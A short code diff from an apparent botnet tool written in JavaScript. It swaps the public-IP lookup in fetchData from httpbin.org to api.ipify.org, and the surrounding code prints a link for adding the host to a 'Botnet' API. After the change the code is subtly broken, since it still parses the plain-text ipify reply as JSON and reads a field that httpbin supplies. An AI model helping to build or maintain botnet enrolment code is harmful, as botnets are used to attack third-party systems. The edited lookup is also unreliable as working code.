@@ -16,7 +16,7 @@ async function scrapeUserAgent() {
   }
 }
 async function fetchData() {
-  const response = await fetch('https://httpbin.org/get');
+  const response = await fetch('https://api.ipify.org/');
   const data = await response.json();
   console.log(`Copy Link This Add To Api Botnet -> http://${data.origin}:${port}`);
   return data;
